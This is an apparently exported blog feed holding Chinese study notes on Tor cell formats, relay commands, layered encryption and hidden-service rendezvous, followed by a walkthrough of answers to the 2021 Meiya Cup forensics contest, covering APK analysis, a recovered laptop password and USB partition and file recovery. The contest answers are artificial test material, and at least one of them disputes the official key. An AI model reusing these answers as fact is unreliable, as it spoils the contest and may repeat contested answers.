class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">1 -- RELAY_BEGIN     [forward] 用于告知服务器开始传输应用数据</span><br><span class="line">2 -- RELAY_DATA      [forward or backward] 用于传输应用数据</span><br><span class="line">3 -- RELAY_END       [forward or backward]</span><br><span class="line">4 -- RELAY_CONNECTED [backward] 用于服务器对RELAY_BEGIN进行响应</span><br><span class="line">5 -- RELAY_SENDME    [forward or backward] [sometimes control]</span><br><span class="line">6 -- RELAY_EXTEND    [forward]             [control]  </span><br><span class="line">7 -- RELAY_EXTENDED  [backward]            [control]</span><br><span class="line">8 -- RELAY_TRUNCATE  [forward]             [control]</span><br><span class="line">9 -- RELAY_TRUNCATED [backward]            [control]</span><br><span class="line">10 -- RELAY_DROP      [forward or backward] [control]</span><br><span class="line">11 -- RELAY_RESOLVE   [forward]</span><br><span class="line">12 -- RELAY_RESOLVED  [backward]</span><br><span class="line">13 -- RELAY_BEGIN_DIR [forward]</span><br><span class="line">14 -- RELAY_EXTEND2   [forward]             [control]</span><br><span class="line">15 -- RELAY_EXTENDED2 [backward]            [control]</span><br><span class="line"></span><br><span class="line">16..18 -- Reserved for UDP; Not yet in use, see prop339.</span><br><span class="line"></span><br><span class="line">32-40 -- 用于IPO和RPO链路:</span><br><span class="line">  32 -- RELAY_COMMAND_ESTABLISH_INTRO</span><br><span class="line">Sent from hidden service host to introduction point; establishes introduction point. </span><br><span class="line">            </span><br><span class="line">      33 -- RELAY_COMMAND_ESTABLISH_RENDEZVOUS</span><br><span class="line">Sent from client to rendezvous point; creates rendezvous point. </span><br><span class="line">            </span><br><span class="line">      34 -- RELAY_COMMAND_INTRODUCE1</span><br><span class="line">Sent from client to introduction point; requests introduction.</span><br><span class="line">            </span><br><span class="line">      35 -- RELAY_COMMAND_INTRODUCE2</span><br><span class="line">Sent from introduction point to hidden service host; requests introduction. Same format as INTRODUCE1. </span><br><span class="line">            </span><br><span class="line">      36 -- RELAY_COMMAND_RENDEZVOUS1</span><br><span class="line">Sent from hidden service host to rendezvous point; attempts to join host&#x27;s circuit to client&#x27;s circuit. </span><br><span class="line"></span><br><span class="line">      37 -- RELAY_COMMAND_RENDEZVOUS2</span><br><span class="line">Sent from rendezvous point to client; reports join of host&#x27;s circuit to client&#x27;s circuit.</span><br><span class="line"></span><br><span class="line">      38 -- RELAY_COMMAND_INTRO_ESTABLISHED</span><br><span class="line">Sent from introduction point to hidden service host; reports status of attempt to establish introduction point. </span><br><span class="line">      39 -- RELAY_COMMAND_RENDEZVOUS_ESTABLISHED</span><br><span class="line">Sent from rendezvous point to client; acknowledges receipt of ESTABLISH_RENDEZVOUS cell. </span><br><span class="line"></span><br><span class="line">      40 -- RELAY_COMMAND_INTRODUCE_ACK</span><br><span class="line">Sent from introduction point to client; acknowledges receipt of INTRODUCE1 cell and reports success/failure.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">41-42 -- 用于链路填充,具体见第5部分</span><br><span class="line"></span><br><span class="line">Used for flow control; see Section 4 of prop324.</span><br><span class="line">43 -- XON             [forward or backward]</span><br><span class="line">44 -- XOFF            [forward or backward]</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><h3 id="3-4-1-Digest-Recognized字段以及加密机制"><a href="#3-4-1-Digest-Recognized字段以及加密机制" class="headerlink" title="3.4.1 Digest, Recognized字段以及加密机制"></a><span id="part_3.4.1">3.4.1 Digest, Recognized字段以及加密机制</span></h3><blockquote><p><code>Digest</code>长度为4字节, <code>Recognized</code>长度为2字节</p><p>为保证端到端通信的完整性,<code>Client</code>会截取自己**运行摘要(running digest)**的前4字节,写入<code>RELAY cell</code>的<code>digest</code>字段. <code>OR</code>收到之后,会将其取出并同自己计算出的运行摘要来比较.</p><p><code>recognized</code>字段用于指示该cell是否仍是被加密的.  一般来说,如果该cell的<code>recognized</code>字段是非0值,<strong>说明payload仍是被加密的</strong>, 此时当前<code>OR</code>应该继续将该cell发送给下一个<code>OR</code> (<strong>注意这样的检查有一定的概率出现错误, 因为此时recognized字段有2^-16的概率恰好为0</strong>)</p><p>因此, 如果<code>recognized</code>字段的值为0, 为了避免可能发生的错误 (尽管概率很小) <code>OR</code>会继续检查<code>digest</code>字段的值是否匹配</p><p>如果<code>recognized</code>值为0,而<code>digest</code>值不匹配, 说明当前的<code>OR</code>并不是这个<code>RELAY cell</code>的接收者, 那么<code>OR</code>应该继续向下传递该cell</p><br><p>假设<code>Client</code>想要给第三个<code>OR</code>(也就是<code>Exit</code>)发送 <code>RELAY cell</code>,那么<code>Client</code>会依次使用这个<code>Exit</code>以及其前面的<code>OR</code>的<strong>会话密钥</strong>迭代加密payload</p><p>该<code>RELAY cell</code>被发送到第一个<code>OR</code>时,第一个<code>OR</code>会对其进行第一次解密,<strong>检查解密后的<code>Recognized</code>字段的值是否是0以及<code>digest</code>字段是否能够正确匹配</strong></p><p>如果不合要求, 则该<code>OR</code>会将解密后的payload部分(也就是<a href="#RELAY_cell">前面图中的灰色部分</a>)封装到一个新的Tor cell中(<strong>也就是添加Tor cell最前面的<code>circuitID</code>和<code>Command</code>字段</strong>)并向下转发.</p><p>直到第三个<code>OR</code>接收到这个cell,解密后检查<code>recognized</code>字段的值为0 , 并且<code>digest</code>字段能够匹配</p><p>此时这个<code>OR</code>会根据<code>Relay Command</code>的值以及<code>data</code>部分的内容来执行相应的操作</p><br><p>从<code>Client</code>处进行被层层加密的是其实只是长度为<strong>509B</strong>的payload部分, Tor链路上的每一个<code>OR</code>都能够识别前面的<code>Circuit ID</code>和<code>Command</code>字段, 并且要对这两个字段进行检查和重新赋值(也就是重新封装<strong>509B</strong>的payload部分)</p><p>在此之前<code>Client</code>已经为<strong>498B</strong>的实际data payload加好了<code>RELAY</code>头,其中的<code>recognized</code>和<code>digest</code>字段只有本次传输的接收方能够正确识别</p><p>这个Tor cell到达每一个<code>OR</code>,并被该<code>OR</code>进行一次解密之后: 如果该<code>OR</code>不是目标节点,那么<strong>509B</strong>的payload<strong>实际上仍然处于密文状态</strong>, 那么这个<code>OR</code>实际上检查的是<code>recognized</code>和<code>digest</code><strong>这个位置上的字节值</strong>(严格来说密文状态下这些字段是不存在的,只是到<strong>相应位置</strong>去检测), 当检查无法识别后,<code>OR</code>再重新为其增加长度为3B的tor头部字段(也就是<code>Circuit ID</code>和<code>Command</code>字段)</p><p>(注意: 每个<code>OR</code>和<code>OR</code>之间的链路的<code>circuitID</code>都不同, 因此<code>OR</code>会在重新添加头部字段的过程中将<code>circuitID</code>换成它同下一个<code>OR</code>之间链路的<code>circuitID</code>)</p></blockquote><br><p>由此其实可以看出:</p><p>对于一个512B的cell,其前3B的tor头部分(<code>circuitID</code>和<code>command</code>)是明文的,后面509B的payload(其中还包括relay头)是在tor的逻辑下进行加密的</p><p>这样的cell在按照计算机网络的五层结构向下封装时,<strong>还会被TLS层进行加密</strong>, 因此如果在传输链路上截获流量是无法识别出流量类型的, 但是如果攻击者控制了<code>entry</code>这样的节点,便可以提取此处经TLS解密后的流量,从而观察到3字节的tor明文头</p><br><h3 id="3-4-2RELAY-EXTEND-2-x2F-RELAY-EXTENDED-2"><a href="#3-4-2RELAY-EXTEND-2-x2F-RELAY-EXTENDED-2" class="headerlink" title="3.4.2RELAY_EXTEND(2)&#x2F;RELAY_EXTENDED(2)"></a>3.4.2RELAY_EXTEND(2)&#x2F;RELAY_EXTENDED(2)</h3><p><code>RELAY_EXTEND(2) cell</code>由<code>Client</code>发出, 用于<strong>在建立链路阶段告知当前链路末端的<code>OR</code>去扩充链路长度</strong> (和下一个<code>OR</code>建立连接)</p><p>例如<code>Client</code>向<code>Entry</code>发送<code>RELAY_EXTEND(2) cell</code>, 告知其去连接某个<code>OR</code>, 这个<code>OR</code>也就是<code>Client</code>正试图建立的链路上的<code>Middle</code>节点(此节点的信息会包含在这个cell的payload中),  <code>Entry</code>在解密得到明文的payload后, 就知道了应该去找那个<code>OR</code>建立连接, 并向这个<code>OR</code>发送命令字段为<code>CREATE</code>的 Tor cell. </p><p><code>RELAY_EXTENDED(2) cell</code>是在<code>OR</code>同下一个节点建立连接后, 对<code>RELAY_EXTEND(2) cell</code>的发出者的响应, 表示告知发出者已经按照其指示同下一个节点建立好了连接. </p><br><p><code>RELAY_EXTEND(2) cell</code>的payload包括以下内容: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NSPEC      (Number of link specifiers)     [1 byte]</span><br><span class="line">NSPEC times:</span><br><span class="line">LSTYPE (Link specifier type)           [1 byte]</span><br><span class="line">LSLEN  (Link specifier length)         [1 byte]</span><br><span class="line">LSPEC  (Link specifier)                [LSLEN bytes]</span><br><span class="line">HTYPE      (Client Handshake Type)         [2 bytes]</span><br><span class="line">HLEN       (Client Handshake Data Len)     [2 bytes]</span><br><span class="line">HDATA      (Client Handshake Data)         [HLEN bytes]</span><br></pre></td></tr></table></figure><p>其中<code>link specifiers</code>描述了要连接的下一个节点的信息(IP,端口等),以及使用什么方式去连接它</p><p>另外, 这一部分是和<code>CREATE2 cell</code>的<a href="#3.3">payload</a>是一致的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTYPE      (Client Handshake Type)         [2 bytes]</span><br><span class="line">HLEN       (Client Handshake Data Len)     [2 bytes]</span><br><span class="line">HDATA      (Client Handshake Data)         [HLEN bytes]</span><br></pre></td></tr></table></figure><p>当前链路末端会直接将这一部分封装到即将发给下一个节点的 <code>CREATE cell</code>中,作为其payload.</p><p>待扩展的<code>OR</code>收到<code>CREATE cell</code>后, 就可以利用客户端发送的握手数据来生成会话密钥并完成握手</p><p>随后,它会向之前的<code>OR</code>回复一个<code>CREATED cell</code></p><p>之前的<code>OR</code>收到后,取出<code>CREATED cell</code>的payload,将其封装成<code>EXTENDED cell</code>,并将其发回<code>Client</code></p><p>至此,<code>Client</code>同待扩展<code>OR</code>的握手完成, 链路也就扩展到了下一个节点上</p><br><h3 id="3-4-3RELAY-BEGIN-x2F-RELAY-CONNECTED"><a href="#3-4-3RELAY-BEGIN-x2F-RELAY-CONNECTED" class="headerlink" title="3.4.3RELAY_BEGIN&#x2F;RELAY_CONNECTED"></a>3.4.3RELAY_BEGIN&#x2F;RELAY_CONNECTED</h3><p>由<code>Client</code>发出, 链路末端的<code>OR</code>(也就是<code>Exit</code>)接受, <code>Client</code>指示其去与要访问的服务器建立连接.</p><p><code>RELAY_BEIGIN cell</code>的payload结构:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ADDRPORT [nul-terminated string] 包含目标服务器的IP和端口</span><br><span class="line">FLAGS    [4 bytes] </span><br><span class="line"># FLAG的值和含义:</span><br><span class="line">      1 -- IPv6 okay.  We support learning about IPv6 addresses and</span><br><span class="line">           connecting to IPv6 addresses.</span><br><span class="line">      2 -- IPv4 not okay.  We don&#x27;t want to learn about IPv4 addresses</span><br><span class="line">           or connect to them.</span><br><span class="line">      3 -- IPv6 preferred.  If there are both IPv4 and IPv6 addresses,</span><br><span class="line">           we want to connect to the IPv6 one.  (By default, we connect</span><br><span class="line">           to the IPv4 address.)</span><br><span class="line">      4..32 -- Reserved. Current clients MUST NOT set these. Servers</span><br><span class="line">           MUST ignore them.</span><br></pre></td></tr></table></figure><p>如果<code>Exit</code>无法找到目标server或者无法同目标server建立TCP连接,它会返回<code>RELAY_END cell</code></p><p>如果成功建立连接,则返回<code>RELAY_CONNECTED cell</code>,其payload结构为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    The IPv4 address to which the connection was made [4 octets]</span><br><span class="line">    A number of seconds (TTL) for which the address may be cached [4 octets]</span><br><span class="line">or</span><br><span class="line">    Four zero-valued octets [4 octets]</span><br><span class="line">    An address type (6)     [1 octet]</span><br><span class="line">    The IPv6 address to which the connection was made [16 octets]</span><br><span class="line">    A number of seconds (TTL) for which the address may be cached [4 octets]</span><br></pre></td></tr></table></figure><p>当连接建立成功之后,<code>Client</code>和server就可以通过<code>RELAY_DATA cells</code>来发送应用数据了</p><blockquote><p>在0.2.3.1-alpha版本之前,如果<code>exit</code>不支持”optimistic data”</p><p>那么<code>Client</code>应该等待至收到<code>RELAY_CONNECTED cell</code> 后才能够开始发送<code>RELAY_DATA cells</code></p><p>后面的版本中,不必再有这个等待过程, <code>Client</code>发送完<code>RELAY_BEGIN cell</code>后可以立即开始发送<code>RELAY_DATA cells</code></p></blockquote><br><br><h2 id="3-5REALY-EARLY-cell"><a href="#3-5REALY-EARLY-cell" class="headerlink" title="3.5REALY_EARLY cell"></a>3.5REALY_EARLY cell</h2><p><code>REALY_EARLY cell</code>是一种特殊的<code>REALY cell</code></p><p><strong>目前新版本的Tor规定, 携带<code>EXTEND</code>命令的 <code>REALY cell</code> 必须改为 <code>REALY_EARLY cell</code></strong> , 并且规定: 如果一个节点收到了累计8个以上<code>outbound</code>方向 (自客户端到服务器) 的<code>REALY_EARLY cell</code>,  或者收到了任何来自<code>inbound</code>方向 (自服务器至客户端) 的<code>REALY_EARLY cell</code> ,  则此节点应该<strong>立刻关闭当前的连接</strong></p><p>因此可以看出, <code>REALY_EARLY cell</code>的意义是<strong>防止恶意攻击者建立过长的链路以进行DOS等形式的攻击</strong>, 那么如果某个<code>OR</code>收到了大于8个 <code>REALY_EARLY cell</code> 信元,就说明<code>Client</code>或者某些<code>OR</code>在恶意地通过发送<code>RELAY_EXTENDED(2) cell</code>来创建过长的链路, 从而耗尽Tor 网络的资源, 达到DOS攻击的效果</p><p>尽管这样做并不能完全地阻止攻击者创建过长的链路, 但是会增加其成本,攻击者需要至少在每8跳处指定一个恶意中继.(每连接7跳后,由该恶意中继继续构造<code>RELAY_EXTENDED(2) cell</code>并向下发送,因此前面构建的链路中的那些正常的<code>OR</code>并不能收到第8个<code>REALY_EARLY cell</code>,也就不会断开连接)</p><br><hr><br><h1 id="4-建立连接和访问"><a href="#4-建立连接和访问" class="headerlink" title="4_建立连接和访问"></a><span id="part_4">4_建立连接和访问</span></h1><p>这里直接上一个画得特明白的图:</p><img id= "RELAY_cell" src="/images/tor-spec/9.png" alt="Tor建立链路以及访问某服务器的过程"  /><p>在建立链路时, <code>Client</code>和<code>Entry</code>通过<code>CREATE2 cell</code>和<code>CREATED2 cell</code>来进行握手, 在这个过程中双方会生成一对会话密钥,这里称为<code>k1</code></p><p>之后, <code>Client</code>为了同<code>Middle</code>进行握手建立连接, 它会向<code>Entry</code>发送<code>RELAY_EXTEND2 cell</code> , 和<code>Middle</code>的握手数据包含在这个cell的relay_payload中. <code>Client</code>使用<code>k1</code>加密了这个cell的payload(注意relay_payload和payload说的不是同一个东西), 因此只有<code>Entry</code>能够解密并识别其中的<code>RELAY_EXTEND2</code>指令.</p><p><code>Entry</code>能够解密并识别了<code>RELAY_EXTEND2</code>指令, 取出relay_payload(也就是<code>Client</code>要发送给<code>Middle</code>的握手数据), 将其封装到一个<code>CREATE2 cell</code>中并发送给<code>Middle</code></p><p><code>Middle</code>会将自己的握手响应数据封装在<code>CREATED2 cell</code>中发给<code>Entry</code>, <code>Entry</code>再将其取出并封装到<code>RELAY_EXTENDED2</code>中发回给<code>Client</code>. 在此过程中, <code>Client</code>和<code>Middle</code>就协商得到了会话密钥<code>k2</code></p><p><code>Client</code>同<code>Exit</code>握手的过程同理, 只不过从<code>Client</code>发出的<code>RELAY_EXTEND2 cell</code>的payload会先使用<code>k2</code>加密, 再使用<code>k1</code>加密, 这样<code>Entry</code>会先使用<code>k1</code>对其进行一次解密, 发现仍然无法识别后(<a href="#part_3.4.1">参考3.4.1</a>), 就会将其继续发送给<code>Middle</code>, <code>Middle</code>使用<code>k2</code>再进行一次解密后, 发现可以识别到<code>RELAY_EXTEND2 cell</code>, 就会向前面的过程一样去找到<code>Exit</code>并向其发送<code>CREATE2 cell</code>.</p><p>在链路建立完成时, <code>Client</code>拥有三个会话密钥, 分别对应<code>Entry</code>,<code>Middle</code>和<code>Exit</code></p><p>那么,当<code>Client</code>准备通过建立好的链路请求某个服务是, 它发送的请求包就是这种形式:(只有<code>Exit</code>能够最后解密得到目标服务的IP和端口,并由此发起请求)</p><img id= "RELAY_cell" src="/images/tor-spec/10.png" alt=""  /><br><br><p>访问<code>HS</code>建立连接的过程见<a href="#part_1.3">1.3</a></p><p><code>HS</code>在创建<code>IPO</code>链路时, 先按照常规流程建立三跳链路, 然后向最后一个<code>OR</code>发送一个 命令字段为<code>RELAY</code>, relay的命令字段为<code>establish_intro</code> ((relay命令字段值为32) 的cell (参考<a href="#relay_command">RELAY_command字段值列表</a>)</p><p>然后该<code>OR</code>回复一个relay命令字段为<code>intro_established</code> (relay命令字段值为38) 的cell, 如此, 该<code>OR</code>就成为了这个<code>HS</code>的 <code>IPO</code></p><p>同理, <code>Client</code>在建立<code>RPO</code>链路时也是一样的过程, 建立三跳链路后向最后一个节点发送relay的命令字段为<code>establish_rendezvous</code>((relay命令字段值为33)的cell. </p><p>然后该<code>OR</code>回复一个relay命令字段为<code>redezvous_established</code> (relay命令字段值为39) 的cell, 如此, 该<code>OR</code>就成为了这个<code>Client</code>的 <code>RPO</code></p><br><blockquote><p>当<code>Client</code>访问<code>HS</code>时,</p><p><code>Client</code>和<code>HS</code>共同持有一对会话密钥<code>k&#39;</code>, 在协商这对密钥过程中, <code>Client</code>的握手信息是通过<code>IPO</code>链路发送给<code>HS</code>的, 而<code>HS</code>的握手信息是通过<code>RPO</code>链路发给<code>Client</code>的.(参考<a href="#part_1.3">1.3</a>).  <code>Client</code>向<code>HS</code>发送信息时,首先使用此密钥进行加密(<strong>也就是说,此为最内层的加密</strong>)</p><p><code>Client</code>持有<code>k&#39;</code>,<code>k1</code>,<code>k2</code>,<code>k3</code> HS持有<code>k&#39;</code>,<code>k4</code>,<code>k5</code>,<code>k6</code>(<strong>对应的是用于传输应用数据的<code>RPO</code>链路上的六个节点</strong>)</p><p>也就是说,Tor cell在<code>Client</code>处会被加密四层, 当Tor cell到达<code>RPO</code>并经过第三次解密后仍是被<code>Client</code>和<code>HS</code>的密钥加密的</p><p>随后,<code>RPO</code>将Tor cell继续转发,<code>OR4</code>,<code>OR5</code>,<code>OR6</code>会使用各自的密钥对其<strong>加密</strong> (这个过程相当于<code>RPO</code>是三跳链路中的服务端, 而<code>HS</code>是三跳链路中的客户端), 所以Tor cell到达<code>HS</code>时,又是被4层加密的<code>,HS</code>会依次使用<code>k6</code>,<code>k5</code>,<code>k4</code>,<code>k&#39;</code>对其逐层解密,获得明文.</p><p><code>HS</code>给<code>Client</code>发数据也是类似的过程</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Tor </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021美亚杯_团队赛下</title>
      <link href="/post/6074697.html"/>
      <url>/post/6074697.html</url>
      
        <content type="html"><![CDATA[<h1 id="PART5常威手机-USB"><a href="#PART5常威手机-USB" class="headerlink" title="PART5常威手机+USB"></a>PART5常威手机+USB</h1><h2 id="49常威手机中Telegram首次下载的时间"><a href="#49常威手机中Telegram首次下载的时间" class="headerlink" title="49常威手机中Telegram首次下载的时间"></a>49常威手机中Telegram首次下载的时间</h2><blockquote><p>【填空题】常威手机中的 Telegram有可能是在2021年9月24日_<strong>12</strong>__时44分58秒UTC+8）首次下载的。（请以阿拉伯数字输入答案）（2分）</p></blockquote><p>从安装的应用程序中可以找到<code>Telegram</code>的购买日期,换算成<strong>UTC+8</strong>时间后就是12时</p><img src="/images/meiya-2021-03/0.png" alt="image-0" style="zoom:67%;" /><br><h2 id="50常威手机曾经连接的无人机名称"><a href="#50常威手机曾经连接的无人机名称" class="headerlink" title="50常威手机曾经连接的无人机名称"></a>50常威手机曾经连接的无人机名称</h2><p>在相关位置中可以找到无人机的飞行记录</p><img src="/images/meiya-2021-03/1.png" alt="image-1" style="zoom:67%;" /><p>在右边的详细信息里可以看到名称是<code>SSPARK</code></p><br><h2 id="51常威手机中档案”dji1633936161416-mp4”的解像度"><a href="#51常威手机中档案”dji1633936161416-mp4”的解像度" class="headerlink" title="51常威手机中档案”dji1633936161416.mp4”的解像度"></a>51常威手机中档案”dji1633936161416.mp4”的解像度</h2><blockquote><p>【填空题】常威手机中，档案”dji1633936161416.mp4”的解像度是___1280720____（例如是1920X1280，请输入19201280）。（1分）</p></blockquote><p>过滤出来这个视频并导出</p><img src="/images/meiya-2021-03/2.png" alt="image-2" style="zoom:67%;" /><p>这里文件名和题目中所给的文件名并不是很符合,题目中给的那个文件名中的<code>1633936161416</code>明显是一个时间戳数据</p><p>把这个时间戳转换一下,发现和找到的这个视频的时间大致能够对应上</p><img src="/images/meiya-2021-03/3.png" alt="image-3" style="zoom:67%;" /><p>导出视频后查看分辨率:</p><img src="/images/meiya-2021-03/4.png" alt="image-4" style="zoom:67%;" /><br><h2 id="52常威手机中「安心出行」安装包的哈希值"><a href="#52常威手机中「安心出行」安装包的哈希值" class="headerlink" title="52常威手机中「安心出行」安装包的哈希值"></a>52常威手机中「安心出行」安装包的哈希值</h2><blockquote><p>【填空题】常威手机中，发现于网络上下载的软件“安心出行”安装档的哈希值（MD5）是？（请以英文全大写及阿拉伯数字回答）（2分）</p></blockquote><p>这里可以找到该安装包的包名</p><img src="/images/meiya-2021-03/5.png" alt="image-5" style="zoom:67%;" /><p>根据源文件路径找到安装包文件并导出</p><img src="/images/meiya-2021-03/6.png" alt="image-6" style="zoom:67%;" /><p>计算<code>md5</code>即可</p><img src="/images/meiya-2021-03/7.png" alt="image-7" style="zoom:67%;" /><br><h2 id="53「安心出行」设计的安全许可权限"><a href="#53「安心出行」设计的安全许可权限" class="headerlink" title="53「安心出行」设计的安全许可权限"></a>53「安心出行」设计的安全许可权限</h2><blockquote><p>【多选题】常威手机中执行软件“安心出行”（版本21.3）中涉及以下安全许可？（2分）</p><p>A android.permission.ACCESS_WIFI_STATE获取WiFi状态</p><p>B android.permission.BATTERY_STATS电量统计</p><p><strong>C Android.permission.VIBRATE使用振动</strong></p><p>D android.permission.CONTROL_LOCATION_UPDATES控制定位更新</p><p><strong>E android.permission.CAMERA拍照权限</strong></p></blockquote><p>导入雷电APP分析软件后查看权限:</p><img src="/images/meiya-2021-03/8.png" alt="image-8" style="zoom:67%;" /><br><h2 id="54哪个不是「安心出行」安装包的签名算法"><a href="#54哪个不是「安心出行」安装包的签名算法" class="headerlink" title="54哪个不是「安心出行」安装包的签名算法"></a>54哪个不是「安心出行」安装包的签名算法</h2><blockquote><p>【多选题】常威手机中软件“安心出行”（版本2.1.3）的安装档（.apk）中，哪个不是它的签名算法？（3分）</p><p><strong>A. MD5withRSA</strong></p><p>B. SHA256withRSA</p><p><strong>C. SHA256withDSA</strong></p><p><strong>D. MD5withDSA</strong></p></blockquote><img src="/images/meiya-2021-03/9.png" alt="image-9" style="zoom:67%;" /><p>选不是的,所以是另外三个</p><br><h2 id="55「安心出行」可能会连接到哪个网站"><a href="#55「安心出行」可能会连接到哪个网站" class="headerlink" title="55「安心出行」可能会连接到哪个网站"></a>55「安心出行」可能会连接到哪个网站</h2><blockquote><p>【多选题】于常威的手机中执行软件“安心出行”（版本1）可能会连接至哪一个网站？（2分）</p><p><strong>A <a href="https://back-home-..........pages.dev/">https://back-home-..........pages.dev</a></strong></p><p>B org.chromium…….a5b80edf82b436506</p><p><strong>C. org.chromium…….a5b80edf82b436506_v2</strong></p><p>D.<a href="https://back-home-........pages.dev/manifest.json">https://back-home-........pages.dev/manifest.json</a></p></blockquote><p>模拟器抓包发现并没有发现选项中的网站</p><img src="/images/meiya-2021-03/10.png" alt="image-10" style="zoom:67%;" /><p>这才发现刚刚导出的是版本2.13….</p><img src="/images/meiya-2021-03/11.png" alt="image-11" style="zoom:67%;" /><p>版本1是另外一个:</p><img src="/images/meiya-2021-03/12.png" alt="image-12" style="zoom:67%;" /><p>导出另外这个apk,并使用雷电分析,这里app自动打开的网页已经可以确定A选项了</p><img src="/images/meiya-2021-03/13.png" alt="image-13" style="zoom:67%;" /><p>但是看选项的意思,BC里边应该还得选出来一个… 那么就得以org为关键词来搜索了</p><p>反编译搜索org,基本上都是带着v2的,所以C项也选上了</p><img src="/images/meiya-2021-03/14.png" alt="image-14" style="zoom:67%;" /><br><br><p>使用取证大师加载USB镜像,发现什么都没有,应该是被格式化过了</p><p>因此先进行恢复(格式化恢复和签名恢复都试了)</p><h2 id="56常威的苹果手提计算机的开机密码-USB中可能有相关数据"><a href="#56常威的苹果手提计算机的开机密码-USB中可能有相关数据" class="headerlink" title="56常威的苹果手提计算机的开机密码(USB中可能有相关数据)"></a>56常威的苹果手提计算机的开机密码(USB中可能有相关数据)</h2><blockquote><p>【单选题】在常咸苹果手提计算机，用户开机密码是什么？提示：常成USB设备中可能有相关数据）（3分）</p><p>A. C##sthegoa#</p><p>B. Draw##fgd#f</p><p>C. Co#kkfid#dd</p><p>D. App#is#won</p></blockquote><p>这里直接找基本上是找不到的,基本上要<strong>原始数据搜索</strong>搜选项了…</p><p>注意这里需要选中搜索勾选文件,不然好像不会将恢复的文件包括进去搜索…</p><img src="/images/meiya-2021-03/15.png" alt="image-15" style="zoom:67%;" /><p>A选项能够搜索到:</p><img src="/images/meiya-2021-03/16.png" alt="image-16" style="zoom:67%;" /><p>密码是<strong>cpisthegoat</strong>  (cris paul is the goat?🤐)</p><br><h2 id="57常威U盘内有多少磁盘分隔区"><a href="#57常威U盘内有多少磁盘分隔区" class="headerlink" title="57常威U盘内有多少磁盘分隔区"></a>57常威U盘内有多少磁盘分隔区</h2><p>使用取证大师恢复完毕之后,制作镜像,然后使用X-way打开</p><img src="/images/meiya-2021-03/17.png" alt="image-17" style="zoom:67%;" /><p>查看MBR表,能够看到4个分区:</p><img src="/images/meiya-2021-03/18.png" alt="image-18" style="zoom:67%;" /><br><h2 id="58在常威U盘内有多少份excel文件"><a href="#58在常威U盘内有多少份excel文件" class="headerlink" title="58在常威U盘内有多少份excel文件"></a>58在常威U盘内有多少份excel文件</h2><p>这里官方给的答案是1个</p><p>但是如果进行了签名恢复的话,能够看见4个</p><img src="/images/meiya-2021-03/19.png" alt="image-19" style="zoom:67%;" /><p>其中<strong>客户资料</strong>和 <strong>未分配簇_00001</strong>是一样的</p><p>所以应该是3个excel文件</p><br><h2 id="59常威U盘内含有多少个客户数据"><a href="#59常威U盘内含有多少个客户数据" class="headerlink" title="59常威U盘内含有多少个客户数据"></a>59常威U盘内含有多少个客户数据</h2><p>将上一题找到的<code>客户资料.xlsx</code>导出,能够看见50条数据</p><img src="/images/meiya-2021-03/20.png" alt="image-20" style="zoom:67%;" /><br><h2 id="60以下哪个客户数据储存在常威U盘内"><a href="#60以下哪个客户数据储存在常威U盘内" class="headerlink" title="60以下哪个客户数据储存在常威U盘内"></a>60以下哪个客户数据储存在常威U盘内</h2><blockquote><p>【多选题】以下哪个客户数据储存在常威U盘内？（3分）</p><p><a href="mailto:&#65;&#x2e;&#x6a;&#109;&#x75;&#x61;&#x74;&#x31;&#x40;&#x72;&#101;&#x66;&#x65;&#x72;&#x65;&#110;&#99;&#101;&#46;&#x63;&#111;&#x6d;">&#65;&#x2e;&#x6a;&#109;&#x75;&#x61;&#x74;&#x31;&#x40;&#x72;&#101;&#x66;&#x65;&#x72;&#x65;&#110;&#99;&#101;&#46;&#x63;&#111;&#x6d;</a></p><p><a href="mailto:&#x42;&#46;&#99;&#x67;&#101;&#114;&#97;&#x75;&#100;&#x67;&#x40;&#x66;&#111;&#114;&#x62;&#x65;&#115;&#x2e;&#99;&#111;&#x6d;">&#x42;&#46;&#99;&#x67;&#101;&#114;&#97;&#x75;&#100;&#x67;&#x40;&#x66;&#111;&#114;&#x62;&#x65;&#115;&#x2e;&#99;&#111;&#x6d;</a></p><p><a href="mailto:C.cwarmishamo@admin.ch">C.cwarmishamo@admin.ch</a></p><p><a href="mailto:&#x44;&#46;&#97;&#x62;&#x64;&#x64;&#102;&#x64;&#102;&#64;&#103;&#111;&#111;&#103;&#108;&#101;&#x2e;&#99;&#x6f;&#109;">&#x44;&#46;&#97;&#x62;&#x64;&#x64;&#102;&#x64;&#102;&#64;&#103;&#111;&#111;&#103;&#108;&#101;&#x2e;&#99;&#x6f;&#109;</a></p><p><a 